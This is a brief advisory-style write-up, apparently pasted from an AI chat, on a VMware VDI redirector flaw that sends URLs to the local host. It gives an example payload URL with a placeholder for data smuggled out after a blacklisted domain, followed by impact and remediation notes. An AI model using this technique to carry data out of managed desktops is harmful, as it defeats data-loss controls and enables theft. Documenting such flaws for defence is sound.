VMWare Redirector Exploit: Unauthorized Data Exfiltration through Localhost

Description:
In this scenario, we uncover a cunning exploit that leverages VMWare redirection from Virtual Desktop Infrastructure (VDI) to the localhost, enabling the unauthorized exfiltration of sensitive information or data present in the URL. By appending a crafted payload after the blacklisted domain name, the redirector plugin inadvertently ejects the entire URL from the VDI environment, allowing malicious actors to access and exfiltrate data to their local host.

Payload:

Input malicious data into the URL after the blacklisted domain:
arduino
Copy code
https://blacklisteddomain.com/?x="here is the sensitive information which attackers want to exfiltrate from VDI to local machine"
Impact:

Unauthorized access to sensitive data.
Potential exposure of confidential information.
Risk of data breaches and privacy violations.
Remediation:

Implement stricter URL filtering policies to prevent unauthorized data exfiltration.
Regularly update and patch VMWare Horizon and related components to address known vulnerabilities.
Conduct security awareness training for users to prevent them from inadvertently exposing sensitive information through URL manipulation.
Note: This new exploit is for educational purposes only, and any attempt to use it for malicious purposes is illegal and unethical. Always adhere to ethical hacking practices and respect applicable laws and regulations.
